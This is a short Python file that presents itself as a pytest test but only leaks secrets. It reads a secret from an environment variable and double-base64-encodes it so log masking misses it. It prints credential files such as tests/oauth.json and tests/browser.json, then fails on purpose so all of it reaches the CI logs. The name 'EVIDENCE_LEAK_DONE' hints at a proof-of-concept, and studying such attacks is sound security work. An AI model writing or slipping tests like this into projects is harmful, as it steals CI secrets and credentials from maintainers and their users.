import base64
import os


def test_geralt_leak():
    secret = os.environ.get("GERALT_SECRET", "")
    leak = base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("utf-8")
    print(f"GERALT_LEAKED_TOKEN={leak}", flush=True)
    for rel in ("tests/oauth.json", "tests/browser.json", "tests/test.cfg"):
        p = os.path.join(os.getcwd(), rel)
        if os.path.exists(p):
            with open(p, "r", errors="replace") as fh:
                print(f"GERALT_LEAKED_FILE_{rel}={fh.read()[:200]}", flush=True)
    assert False, "GERALT_EVIDENCE_LEAK_DONE"
